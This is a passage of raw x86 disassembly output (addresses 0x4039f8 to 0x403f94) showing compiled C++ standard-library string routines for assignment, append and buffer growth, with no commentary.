  4039f8:	8b f1                	mov    %ecx,%esi
  4039fa:	85 db                	test   %ebx,%ebx
  4039fc:	74 59                	je     0x403a57
  4039fe:	8b 4e 14             	mov    0x14(%esi),%ecx
  403a01:	83 f9 10             	cmp    $0x10,%ecx
  403a04:	72 04                	jb     0x403a0a
  403a06:	8b 06                	mov    (%esi),%eax
  403a08:	eb 02                	jmp    0x403a0c
  403a0a:	8b c6                	mov    %esi,%eax
  403a0c:	3b d8                	cmp    %eax,%ebx
  403a0e:	72 47                	jb     0x403a57
  403a10:	83 f9 10             	cmp    $0x10,%ecx
  403a13:	72 04                	jb     0x403a19
  403a15:	8b 06                	mov    (%esi),%eax
  403a17:	eb 02                	jmp    0x403a1b
  403a19:	8b c6                	mov    %esi,%eax
  403a1b:	8b 56 10             	mov    0x10(%esi),%edx
  403a1e:	03 d0                	add    %eax,%edx
  403a20:	3b d3                	cmp    %ebx,%edx
  403a22:	76 33                	jbe    0x403a57
  403a24:	83 f9 10             	cmp    $0x10,%ecx
  403a27:	72 17                	jb     0x403a40
  403a29:	8b 06                	mov    (%esi),%eax
  403a2b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403a2e:	51                   	push   %ecx
  403a2f:	2b d8                	sub    %eax,%ebx
  403a31:	53                   	push   %ebx
  403a32:	56                   	push   %esi
  403a33:	8b ce                	mov    %esi,%ecx
  403a35:	e8 e6 01 00 00       	call   0x403c20
  403a3a:	5e                   	pop    %esi
  403a3b:	5b                   	pop    %ebx
  403a3c:	5d                   	pop    %ebp
  403a3d:	c2 08 00             	ret    $0x8
  403a40:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403a43:	8b c6                	mov    %esi,%eax
  403a45:	51                   	push   %ecx
  403a46:	2b d8                	sub    %eax,%ebx
  403a48:	53                   	push   %ebx
  403a49:	56                   	push   %esi
  403a4a:	8b ce                	mov    %esi,%ecx
  403a4c:	e8 cf 01 00 00       	call   0x403c20
  403a51:	5e                   	pop    %esi
  403a52:	5b                   	pop    %ebx
  403a53:	5d                   	pop    %ebp
  403a54:	c2 08 00             	ret    $0x8
  403a57:	57                   	push   %edi
  403a58:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403a5b:	83 ff fe             	cmp    $0xfffffffe,%edi
  403a5e:	76 0a                	jbe    0x403a6a
  403a60:	68 e8 93 42 00       	push   $0x4293e8
  403a65:	e8 89 f4 01 00       	call   0x422ef3
  403a6a:	8b 46 14             	mov    0x14(%esi),%eax
  403a6d:	3b c7                	cmp    %edi,%eax
  403a6f:	73 1a                	jae    0x403a8b
  403a71:	8b 56 10             	mov    0x10(%esi),%edx
  403a74:	52                   	push   %edx
  403a75:	57                   	push   %edi
  403a76:	8b ce                	mov    %esi,%ecx
  403a78:	e8 03 06 00 00       	call   0x404080
  403a7d:	85 ff                	test   %edi,%edi
  403a7f:	74 5b                	je     0x403adc
  403a81:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403a85:	72 2a                	jb     0x403ab1
  403a87:	8b 06                	mov    (%esi),%eax
  403a89:	eb 28                	jmp    0x403ab3
  403a8b:	85 ff                	test   %edi,%edi
  403a8d:	75 f2                	jne    0x403a81
  403a8f:	89 7e 10             	mov    %edi,0x10(%esi)
  403a92:	83 f8 10             	cmp    $0x10,%eax
  403a95:	72 0e                	jb     0x403aa5
  403a97:	8b 06                	mov    (%esi),%eax
  403a99:	5f                   	pop    %edi
  403a9a:	c6 00 00             	movb   $0x0,(%eax)
  403a9d:	8b c6                	mov    %esi,%eax
  403a9f:	5e                   	pop    %esi
  403aa0:	5b                   	pop    %ebx
  403aa1:	5d                   	pop    %ebp
  403aa2:	c2 08 00             	ret    $0x8
  403aa5:	5f                   	pop    %edi
  403aa6:	8b c6                	mov    %esi,%eax
  403aa8:	5e                   	pop    %esi
  403aa9:	c6 00 00             	movb   $0x0,(%eax)
  403aac:	5b                   	pop    %ebx
  403aad:	5d                   	pop    %ebp
  403aae:	c2 08 00             	ret    $0x8
  403ab1:	8b c6                	mov    %esi,%eax
  403ab3:	57                   	push   %edi
  403ab4:	53                   	push   %ebx
  403ab5:	50                   	push   %eax
  403ab6:	e8 75 0a 01 00       	call   0x414530
  403abb:	83 c4 0c             	add    $0xc,%esp
  403abe:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403ac2:	89 7e 10             	mov    %edi,0x10(%esi)
  403ac5:	72 0f                	jb     0x403ad6
  403ac7:	8b 06                	mov    (%esi),%eax
  403ac9:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  403acd:	5f                   	pop    %edi
  403ace:	8b c6                	mov    %esi,%eax
  403ad0:	5e                   	pop    %esi
  403ad1:	5b                   	pop    %ebx
  403ad2:	5d                   	pop    %ebp
  403ad3:	c2 08 00             	ret    $0x8
  403ad6:	8b c6                	mov    %esi,%eax
  403ad8:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  403adc:	5f                   	pop    %edi
  403add:	8b c6                	mov    %esi,%eax
  403adf:	5e                   	pop    %esi
  403ae0:	5b                   	pop    %ebx
  403ae1:	5d                   	pop    %ebp
  403ae2:	c2 08 00             	ret    $0x8
  403ae5:	cc                   	int3
  403ae6:	cc                   	int3
  403ae7:	cc                   	int3
  403ae8:	cc                   	int3
  403ae9:	cc                   	int3
  403aea:	cc                   	int3
  403aeb:	cc                   	int3
  403aec:	cc                   	int3
  403aed:	cc                   	int3
  403aee:	cc                   	int3
  403aef:	cc                   	int3
  403af0:	55                   	push   %ebp
  403af1:	8b ec                	mov    %esp,%ebp
  403af3:	53                   	push   %ebx
  403af4:	8b d8                	mov    %eax,%ebx
  403af6:	57                   	push   %edi
  403af7:	8b f9                	mov    %ecx,%edi
  403af9:	85 db                	test   %ebx,%ebx
  403afb:	74 58                	je     0x403b55
  403afd:	8b 4f 14             	mov    0x14(%edi),%ecx
  403b00:	83 f9 08             	cmp    $0x8,%ecx
  403b03:	72 04                	jb     0x403b09
  403b05:	8b 07                	mov    (%edi),%eax
  403b07:	eb 02                	jmp    0x403b0b
  403b09:	8b c7                	mov    %edi,%eax
  403b0b:	3b d8                	cmp    %eax,%ebx
  403b0d:	72 46                	jb     0x403b55
  403b0f:	83 f9 08             	cmp    $0x8,%ecx
  403b12:	72 04                	jb     0x403b18
  403b14:	8b 07                	mov    (%edi),%eax
  403b16:	eb 02                	jmp    0x403b1a
  403b18:	8b c7                	mov    %edi,%eax
  403b1a:	8b 57 10             	mov    0x10(%edi),%edx
  403b1d:	8d 04 50             	lea    (%eax,%edx,2),%eax
  403b20:	3b c3                	cmp    %ebx,%eax
  403b22:	76 31                	jbe    0x403b55
  403b24:	83 f9 08             	cmp    $0x8,%ecx
  403b27:	72 16                	jb     0x403b3f
  403b29:	8b 07                	mov    (%edi),%eax
  403b2b:	2b d8                	sub    %eax,%ebx
  403b2d:	8b 45 08             	mov    0x8(%ebp),%eax
  403b30:	d1 fb                	sar    $1,%ebx
  403b32:	53                   	push   %ebx
  403b33:	57                   	push   %edi
  403b34:	e8 87 02 00 00       	call   0x403dc0
  403b39:	5f                   	pop    %edi
  403b3a:	5b                   	pop    %ebx
  403b3b:	5d                   	pop    %ebp
  403b3c:	c2 04 00             	ret    $0x4
  403b3f:	8b c7                	mov    %edi,%eax
  403b41:	2b d8                	sub    %eax,%ebx
  403b43:	8b 45 08             	mov    0x8(%ebp),%eax
  403b46:	d1 fb                	sar    $1,%ebx
  403b48:	53                   	push   %ebx
  403b49:	57                   	push   %edi
  403b4a:	e8 71 02 00 00       	call   0x403dc0
  403b4f:	5f                   	pop    %edi
  403b50:	5b                   	pop    %ebx
  403b51:	5d                   	pop    %ebp
  403b52:	c2 04 00             	ret    $0x4
  403b55:	8b 47 10             	mov    0x10(%edi),%eax
  403b58:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403b5b:	83 ca ff             	or     $0xffffffff,%edx
  403b5e:	2b d0                	sub    %eax,%edx
  403b60:	3b d1                	cmp    %ecx,%edx
  403b62:	77 0a                	ja     0x403b6e
  403b64:	68 e8 93 42 00       	push   $0x4293e8
  403b69:	e8 85 f3 01 00       	call   0x422ef3
  403b6e:	85 c9                	test   %ecx,%ecx
  403b70:	74 55                	je     0x403bc7
  403b72:	56                   	push   %esi
  403b73:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  403b76:	8b c7                	mov    %edi,%eax
  403b78:	e8 53 00 00 00       	call   0x403bd0
  403b7d:	84 c0                	test   %al,%al
  403b7f:	74 45                	je     0x403bc6
  403b81:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  403b85:	72 04                	jb     0x403b8b
  403b87:	8b 07                	mov    (%edi),%eax
  403b89:	eb 02                	jmp    0x403b8d
  403b8b:	8b c7                	mov    %edi,%eax
  403b8d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403b90:	8d 14 09             	lea    (%ecx,%ecx,1),%edx
  403b93:	8b 4f 10             	mov    0x10(%edi),%ecx
  403b96:	52                   	push   %edx
  403b97:	8d 14 48             	lea    (%eax,%ecx,2),%edx
  403b9a:	53                   	push   %ebx
  403b9b:	52                   	push   %edx
  403b9c:	e8 8f 09 01 00       	call   0x414530
  403ba1:	83 c4 0c             	add    $0xc,%esp
  403ba4:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  403ba8:	89 77 10             	mov    %esi,0x10(%edi)
  403bab:	72 11                	jb     0x403bbe
  403bad:	8b 07                	mov    (%edi),%eax
  403baf:	33 c9                	xor    %ecx,%ecx
  403bb1:	66 89 0c 70          	mov    %cx,(%eax,%esi,2)
  403bb5:	5e                   	pop    %esi
  403bb6:	8b c7                	mov    %edi,%eax
  403bb8:	5f                   	pop    %edi
  403bb9:	5b                   	pop    %ebx
  403bba:	5d                   	pop    %ebp
  403bbb:	c2 04 00             	ret    $0x4
  403bbe:	8b c7                	mov    %edi,%eax
  403bc0:	33 c9                	xor    %ecx,%ecx
  403bc2:	66 89 0c 70          	mov    %cx,(%eax,%esi,2)
  403bc6:	5e                   	pop    %esi
  403bc7:	8b c7                	mov    %edi,%eax
  403bc9:	5f                   	pop    %edi
  403bca:	5b                   	pop    %ebx
  403bcb:	5d                   	pop    %ebp
  403bcc:	c2 04 00             	ret    $0x4
  403bcf:	cc                   	int3
  403bd0:	81 fe fe ff ff 7f    	cmp    $0x7ffffffe,%esi
  403bd6:	76 0a                	jbe    0x403be2
  403bd8:	68 e8 93 42 00       	push   $0x4293e8
  403bdd:	e8 11 f3 01 00       	call   0x422ef3
  403be2:	8b 48 14             	mov    0x14(%eax),%ecx
  403be5:	3b ce                	cmp    %esi,%ecx
  403be7:	73 14                	jae    0x403bfd
  403be9:	8b 48 10             	mov    0x10(%eax),%ecx
  403bec:	51                   	push   %ecx
  403bed:	56                   	push   %esi
  403bee:	50                   	push   %eax
  403bef:	e8 7c 02 00 00       	call   0x403e70
  403bf4:	33 c0                	xor    %eax,%eax
  403bf6:	3b c6                	cmp    %esi,%eax
  403bf8:	1b c0                	sbb    %eax,%eax
  403bfa:	f7 d8                	neg    %eax
  403bfc:	c3                   	ret
  403bfd:	85 f6                	test   %esi,%esi
  403bff:	75 0f                	jne    0x403c10
  403c01:	89 70 10             	mov    %esi,0x10(%eax)
  403c04:	83 f9 08             	cmp    $0x8,%ecx
  403c07:	72 02                	jb     0x403c0b
  403c09:	8b 00                	mov    (%eax),%eax
  403c0b:	33 d2                	xor    %edx,%edx
  403c0d:	66 89 10             	mov    %dx,(%eax)
  403c10:	33 c0                	xor    %eax,%eax
  403c12:	3b c6                	cmp    %esi,%eax
  403c14:	1b c0                	sbb    %eax,%eax
  403c16:	f7 d8                	neg    %eax
  403c18:	c3                   	ret
  403c19:	cc                   	int3
  403c1a:	cc                   	int3
  403c1b:	cc                   	int3
  403c1c:	cc                   	int3
  403c1d:	cc                   	int3
  403c1e:	cc                   	int3
  403c1f:	cc                   	int3
  403c20:	55                   	push   %ebp
  403c21:	8b ec                	mov    %esp,%ebp
  403c23:	53                   	push   %ebx
  403c24:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403c27:	56                   	push   %esi
  403c28:	8b f1                	mov    %ecx,%esi
  403c2a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c2d:	57                   	push   %edi
  403c2e:	8b 79 10             	mov    0x10(%ecx),%edi
  403c31:	3b fb                	cmp    %ebx,%edi
  403c33:	73 0a                	jae    0x403c3f
  403c35:	68 d0 93 42 00       	push   $0x4293d0
  403c3a:	e8 01 f3 01 00       	call   0x422f40
  403c3f:	8b 45 10             	mov    0x10(%ebp),%eax
  403c42:	2b fb                	sub    %ebx,%edi
  403c44:	3b c7                	cmp    %edi,%eax
  403c46:	73 02                	jae    0x403c4a
  403c48:	8b f8                	mov    %eax,%edi
  403c4a:	3b f1                	cmp    %ecx,%esi
  403c4c:	75 1f                	jne    0x403c6d
  403c4e:	6a ff                	push   $0xffffffff
  403c50:	03 fb                	add    %ebx,%edi
  403c52:	57                   	push   %edi
  403c53:	8b ce                	mov    %esi,%ecx
  403c55:	e8 96 03 00 00       	call   0x403ff0
  403c5a:	53                   	push   %ebx
  403c5b:	6a 00                	push   $0x0
  403c5d:	8b ce                	mov    %esi,%ecx
  403c5f:	e8 8c 03 00 00       	call   0x403ff0
  403c64:	5f                   	pop    %edi
  403c65:	8b c6                	mov    %esi,%eax
  403c67:	5e                   	pop    %esi
  403c68:	5b                   	pop    %ebx
  403c69:	5d                   	pop    %ebp
  403c6a:	c2 0c 00             	ret    $0xc
  403c6d:	83 ff fe             	cmp    $0xfffffffe,%edi
  403c70:	76 0a                	jbe    0x403c7c
  403c72:	68 e8 93 42 00       	push   $0x4293e8
  403c77:	e8 77 f2 01 00       	call   0x422ef3
  403c7c:	8b 46 14             	mov    0x14(%esi),%eax
  403c7f:	3b c7                	cmp    %edi,%eax
  403c81:	73 28                	jae    0x403cab
  403c83:	8b 46 10             	mov    0x10(%esi),%eax
  403c86:	50                   	push   %eax
  403c87:	57                   	push   %edi
  403c88:	8b ce                	mov    %esi,%ecx
  403c8a:	e8 f1 03 00 00       	call   0x404080
  403c8f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c92:	85 ff                	test   %edi,%edi
  403c94:	74 68                	je     0x403cfe
  403c96:	b8 10 00 00 00       	mov    $0x10,%eax
  403c9b:	39 41 14             	cmp    %eax,0x14(%ecx)
  403c9e:	72 02                	jb     0x403ca2
  403ca0:	8b 09                	mov    (%ecx),%ecx
  403ca2:	39 46 14             	cmp    %eax,0x14(%esi)
  403ca5:	72 2a                	jb     0x403cd1
  403ca7:	8b 06                	mov    (%esi),%eax
  403ca9:	eb 28                	jmp    0x403cd3
  403cab:	85 ff                	test   %edi,%edi
  403cad:	75 e7                	jne    0x403c96
  403caf:	89 7e 10             	mov    %edi,0x10(%esi)
  403cb2:	83 f8 10             	cmp    $0x10,%eax
  403cb5:	72 0e                	jb     0x403cc5
  403cb7:	8b 06                	mov    (%esi),%eax
  403cb9:	5f                   	pop    %edi
  403cba:	c6 00 00             	movb   $0x0,(%eax)
  403cbd:	8b c6                	mov    %esi,%eax
  403cbf:	5e                   	pop    %esi
  403cc0:	5b                   	pop    %ebx
  403cc1:	5d                   	pop    %ebp
  403cc2:	c2 0c 00             	ret    $0xc
  403cc5:	5f                   	pop    %edi
  403cc6:	8b c6                	mov    %esi,%eax
  403cc8:	5e                   	pop    %esi
  403cc9:	c6 00 00             	movb   $0x0,(%eax)
  403ccc:	5b                   	pop    %ebx
  403ccd:	5d                   	pop    %ebp
  403cce:	c2 0c 00             	ret    $0xc
  403cd1:	8b c6                	mov    %esi,%eax
  403cd3:	57                   	push   %edi
  403cd4:	03 cb                	add    %ebx,%ecx
  403cd6:	51                   	push   %ecx
  403cd7:	50                   	push   %eax
  403cd8:	e8 53 08 01 00       	call   0x414530
  403cdd:	83 c4 0c             	add    $0xc,%esp
  403ce0:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403ce4:	89 7e 10             	mov    %edi,0x10(%esi)
  403ce7:	72 0f                	jb     0x403cf8
  403ce9:	8b 06                	mov    (%esi),%eax
  403ceb:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  403cef:	5f                   	pop    %edi
  403cf0:	8b c6                	mov    %esi,%eax
  403cf2:	5e                   	pop    %esi
  403cf3:	5b                   	pop    %ebx
  403cf4:	5d                   	pop    %ebp
  403cf5:	c2 0c 00             	ret    $0xc
  403cf8:	8b c6                	mov    %esi,%eax
  403cfa:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  403cfe:	5f                   	pop    %edi
  403cff:	8b c6                	mov    %esi,%eax
  403d01:	5e                   	pop    %esi
  403d02:	5b                   	pop    %ebx
  403d03:	5d                   	pop    %ebp
  403d04:	c2 0c 00             	ret    $0xc
  403d07:	cc                   	int3
  403d08:	cc                   	int3
  403d09:	cc                   	int3
  403d0a:	cc                   	int3
  403d0b:	cc                   	int3
  403d0c:	cc                   	int3
  403d0d:	cc                   	int3
  403d0e:	cc                   	int3
  403d0f:	cc                   	int3
  403d10:	55                   	push   %ebp
  403d11:	8b ec                	mov    %esp,%ebp
  403d13:	53                   	push   %ebx
  403d14:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403d17:	56                   	push   %esi
  403d18:	8b f1                	mov    %ecx,%esi
  403d1a:	83 fb fe             	cmp    $0xfffffffe,%ebx
  403d1d:	76 0a                	jbe    0x403d29
  403d1f:	68 e8 93 42 00       	push   $0x4293e8
  403d24:	e8 ca f1 01 00       	call   0x422ef3
  403d29:	8b 46 14             	mov    0x14(%esi),%eax
  403d2c:	3b c3                	cmp    %ebx,%eax
  403d2e:	73 18                	jae    0x403d48
  403d30:	8b 46 10             	mov    0x10(%esi),%eax
  403d33:	50                   	push   %eax
  403d34:	53                   	push   %ebx
  403d35:	e8 46 03 00 00       	call   0x404080
  403d3a:	33 c9                	xor    %ecx,%ecx
  403d3c:	3b cb                	cmp    %ebx,%ecx
  403d3e:	1b c0                	sbb    %eax,%eax
  403d40:	5e                   	pop    %esi
  403d41:	f7 d8                	neg    %eax
  403d43:	5b                   	pop    %ebx
  403d44:	5d                   	pop    %ebp
  403d45:	c2 08 00             	ret    $0x8
  403d48:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  403d4c:	74 4e                	je     0x403d9c
  403d4e:	83 fb 10             	cmp    $0x10,%ebx
  403d51:	73 49                	jae    0x403d9c
  403d53:	57                   	push   %edi
  403d54:	8b 7e 10             	mov    0x10(%esi),%edi
  403d57:	3b df                	cmp    %edi,%ebx
  403d59:	73 02                	jae    0x403d5d
  403d5b:	8b fb                	mov    %ebx,%edi
  403d5d:	83 f8 10             	cmp    $0x10,%eax
  403d60:	72 1d                	jb     0x403d7f
  403d62:	8b 1e                	mov    (%esi),%ebx
  403d64:	85 ff                	test   %edi,%edi
  403d66:	74 0b                	je     0x403d73
  403d68:	57                   	push   %edi
  403d69:	53                   	push   %ebx
  403d6a:	56                   	push   %esi
  403d6b:	e8 c0 07 01 00       	call   0x414530
  403d70:	83 c4 0c             	add    $0xc,%esp
  403d73:	53                   	push   %ebx
  403d74:	e8 54 e7 00 00       	call   0x4124cd
  403d79:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403d7c:	83 c4 04             	add    $0x4,%esp
  403d7f:	89 7e 10             	mov    %edi,0x10(%esi)
  403d82:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  403d89:	33 c9                	xor    %ecx,%ecx
  403d8b:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  403d8f:	3b cb                	cmp    %ebx,%ecx
  403d91:	5f                   	pop    %edi
  403d92:	1b c0                	sbb    %eax,%eax
  403d94:	5e                   	pop    %esi
  403d95:	f7 d8                	neg    %eax
  403d97:	5b                   	pop    %ebx
  403d98:	5d                   	pop    %ebp
  403d99:	c2 08 00             	ret    $0x8
  403d9c:	85 db                	test   %ebx,%ebx
  403d9e:	75 0d                	jne    0x403dad
  403da0:	89 5e 10             	mov    %ebx,0x10(%esi)
  403da3:	83 f8 10             	cmp    $0x10,%eax
  403da6:	72 02                	jb     0x403daa
  403da8:	8b 36                	mov    (%esi),%esi
  403daa:	c6 06 00             	movb   $0x0,(%esi)
  403dad:	33 c9                	xor    %ecx,%ecx
  403daf:	3b cb                	cmp    %ebx,%ecx
  403db1:	1b c0                	sbb    %eax,%eax
  403db3:	5e                   	pop    %esi
  403db4:	f7 d8                	neg    %eax
  403db6:	5b                   	pop    %ebx
  403db7:	5d                   	pop    %ebp
  403db8:	c2 08 00             	ret    $0x8
  403dbb:	cc                   	int3
  403dbc:	cc                   	int3
  403dbd:	cc                   	int3
  403dbe:	cc                   	int3
  403dbf:	cc                   	int3
  403dc0:	55                   	push   %ebp
  403dc1:	8b ec                	mov    %esp,%ebp
  403dc3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403dc6:	53                   	push   %ebx
  403dc7:	8b d8                	mov    %eax,%ebx
  403dc9:	8b 45 08             	mov    0x8(%ebp),%eax
  403dcc:	8b 40 10             	mov    0x10(%eax),%eax
  403dcf:	3b c1                	cmp    %ecx,%eax
  403dd1:	73 0a                	jae    0x403ddd
  403dd3:	68 d0 93 42 00       	push   $0x4293d0
  403dd8:	e8 63 f1 01 00       	call   0x422f40
  403ddd:	2b c1                	sub    %ecx,%eax
  403ddf:	3b c3                	cmp    %ebx,%eax
  403de1:	73 02                	jae    0x403de5
  403de3:	8b d8                	mov    %eax,%ebx
  403de5:	8b 47 10             	mov    0x10(%edi),%eax
  403de8:	83 c9 ff             	or     $0xffffffff,%ecx
  403deb:	2b c8                	sub    %eax,%ecx
  403ded:	3b cb                	cmp    %ebx,%ecx
  403def:	77 0a                	ja     0x403dfb
  403df1:	68 e8 93 42 00       	push   $0x4293e8
  403df6:	e8 f8 f0 01 00       	call   0x422ef3
  403dfb:	85 db                	test   %ebx,%ebx
  403dfd:	74 65                	je     0x403e64
  403dff:	56                   	push   %esi
  403e00:	8d 34 18             	lea    (%eax,%ebx,1),%esi
  403e03:	8b c7                	mov    %edi,%eax
  403e05:	e8 c6 fd ff ff       	call   0x403bd0
  403e0a:	84 c0                	test   %al,%al
  403e0c:	74 55                	je     0x403e63
  403e0e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e11:	b8 08 00 00 00       	mov    $0x8,%eax
  403e16:	39 41 14             	cmp    %eax,0x14(%ecx)
  403e19:	72 02                	jb     0x403e1d
  403e1b:	8b 09                	mov    (%ecx),%ecx
  403e1d:	39 47 14             	cmp    %eax,0x14(%edi)
  403e20:	72 04                	jb     0x403e26
  403e22:	8b 07                	mov    (%edi),%eax
  403e24:	eb 02                	jmp    0x403e28
  403e26:	8b c7                	mov    %edi,%eax
  403e28:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  403e2b:	52                   	push   %edx
  403e2c:	8b 55 0c             	mov    0xc(%ebp),%edx
  403e2f:	8d 0c 51             	lea    (%ecx,%edx,2),%ecx
  403e32:	8b 57 10             	mov    0x10(%edi),%edx
  403e35:	51                   	push   %ecx
  403e36:	8d 04 50             	lea    (%eax,%edx,2),%eax
  403e39:	50                   	push   %eax
  403e3a:	e8 f1 06 01 00       	call   0x414530
  403e3f:	83 c4 0c             	add    $0xc,%esp
  403e42:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  403e46:	89 77 10             	mov    %esi,0x10(%edi)
  403e49:	72 10                	jb     0x403e5b
  403e4b:	8b 07                	mov    (%edi),%eax
  403e4d:	33 c9                	xor    %ecx,%ecx
  403e4f:	66 89 0c 70          	mov    %cx,(%eax,%esi,2)
  403e53:	5e                   	pop    %esi
  403e54:	8b c7                	mov    %edi,%eax
  403e56:	5b                   	pop    %ebx
  403e57:	5d                   	pop    %ebp
  403e58:	c2 08 00             	ret    $0x8
  403e5b:	8b c7                	mov    %edi,%eax
  403e5d:	33 c9                	xor    %ecx,%ecx
  403e5f:	66 89 0c 70          	mov    %cx,(%eax,%esi,2)
  403e63:	5e                   	pop    %esi
  403e64:	8b c7                	mov    %edi,%eax
  403e66:	5b                   	pop    %ebx
  403e67:	5d                   	pop    %ebp
  403e68:	c2 08 00             	ret    $0x8
  403e6b:	cc                   	int3
  403e6c:	cc                   	int3
  403e6d:	cc                   	int3
  403e6e:	cc                   	int3
  403e6f:	cc                   	int3
  403e70:	55                   	push   %ebp
  403e71:	8b ec                	mov    %esp,%ebp
  403e73:	6a ff                	push   $0xffffffff
  403e75:	68 50 3e 42 00       	push   $0x423e50
  403e7a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403e80:	50                   	push   %eax
  403e81:	83 ec 18             	sub    $0x18,%esp
  403e84:	53                   	push   %ebx
  403e85:	56                   	push   %esi
  403e86:	57                   	push   %edi
  403e87:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  403e8c:	33 c5                	xor    %ebp,%eax
  403e8e:	50                   	push   %eax
  403e8f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403e92:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403e98:	89 65 f0             	mov    %esp,-0x10(%ebp)
  403e9b:	8b 45 0c             	mov    0xc(%ebp),%eax
  403e9e:	8b 7d 08             	mov    0x8(%ebp),%edi
  403ea1:	8b f0                	mov    %eax,%esi
  403ea3:	83 ce 07             	or     $0x7,%esi
  403ea6:	81 fe fe ff ff 7f    	cmp    $0x7ffffffe,%esi
  403eac:	76 04                	jbe    0x403eb2
  403eae:	8b f0                	mov    %eax,%esi
  403eb0:	eb 27                	jmp    0x403ed9
  403eb2:	8b 5f 14             	mov    0x14(%edi),%ebx
  403eb5:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  403eba:	f7 e6                	mul    %esi
  403ebc:	8b cb                	mov    %ebx,%ecx
  403ebe:	d1 e9                	shr    $1,%ecx
  403ec0:	d1 ea                	shr    $1,%edx
  403ec2:	3b ca                	cmp    %edx,%ecx
  403ec4:	76 13                	jbe    0x403ed9
  403ec6:	b8 fe ff ff 7f       	mov    $0x7ffffffe,%eax
  403ecb:	2b c1                	sub    %ecx,%eax
  403ecd:	8d 34 19             	lea    (%ecx,%ebx,1),%esi
  403ed0:	3b d8                	cmp    %eax,%ebx
  403ed2:	76 05                	jbe    0x403ed9
  403ed4:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  403ed9:	33 c0                	xor    %eax,%eax
  403edb:	8d 4e 01             	lea    0x1(%esi),%ecx
  403ede:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403ee1:	3b c8                	cmp    %eax,%ecx
  403ee3:	76 17                	jbe    0x403efc
  403ee5:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  403eeb:	77 1a                	ja     0x403f07
  403eed:	03 c9                	add    %ecx,%ecx
  403eef:	51                   	push   %ecx
  403ef0:	e8 32 ea 00 00       	call   0x412927
  403ef5:	83 c4 04             	add    $0x4,%esp
  403ef8:	85 c0                	test   %eax,%eax
  403efa:	74 0b                	je     0x403f07
  403efc:	8b d8                	mov    %eax,%ebx
  403efe:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403f05:	eb 56                	jmp    0x403f5d
  403f07:	8d 55 ec             	lea    -0x14(%ebp),%edx
  403f0a:	52                   	push   %edx
  403f0b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403f0e:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  403f15:	e8 33 eb 00 00       	call   0x412a4d
  403f1a:	68 4c b3 42 00       	push   $0x42b34c
  403f1f:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403f22:	50                   	push   %eax
  403f23:	c7 45 dc 50 55 42 00 	movl   $0x425550,-0x24(%ebp)
  403f2a:	e8 62 fe 00 00       	call   0x413d91
  403f2f:	8b 45 0c             	mov    0xc(%ebp),%eax
  403f32:	8d 48 01             	lea    0x1(%eax),%ecx
  403f35:	89 65 f0             	mov    %esp,-0x10(%ebp)
  403f38:	89 45 0c             	mov    %eax,0xc(%ebp)
  403f3b:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403f3f:	e8 bc 02 00 00       	call   0x404200
  403f44:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403f47:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403f4e:	b8 54 3f 40 00       	mov    $0x403f54,%eax
  403f53:	c3                   	ret
  403f54:	8b 7d 08             	mov    0x8(%ebp),%edi
  403f57:	8b 75 0c             	mov    0xc(%ebp),%esi
  403f5a:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  403f5d:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403f60:	85 c9                	test   %ecx,%ecx
  403f62:	74 1c                	je     0x403f80
  403f64:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  403f68:	72 04                	jb     0x403f6e
  403f6a:	8b 07                	mov    (%edi),%eax
  403f6c:	eb 02                	jmp    0x403f70
  403f6e:	8b c7                	mov    %edi,%eax
  403f70:	03 c9                	add    %ecx,%ecx
  403f72:	51                   	push   %ecx
  403f73:	50                   	push   %eax
  403f74:	53                   	push   %ebx
  403f75:	e8 b6 05 01 00       	call   0x414530
  403f7a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403f7d:	83 c4 0c             	add    $0xc,%esp
  403f80:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  403f84:	72 0e                	jb     0x403f94
  403f86:	8b 17                	mov    (%edi),%edx
  403f88:	52                   	push   %edx
  403f89:	e8 3f e5 00 00       	call   0x4124cd
  403f8e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403f91:	83 c4 04             	add    $0x4,%esp
  403f94:	89 1f                	mov    %ebx,(%edi)
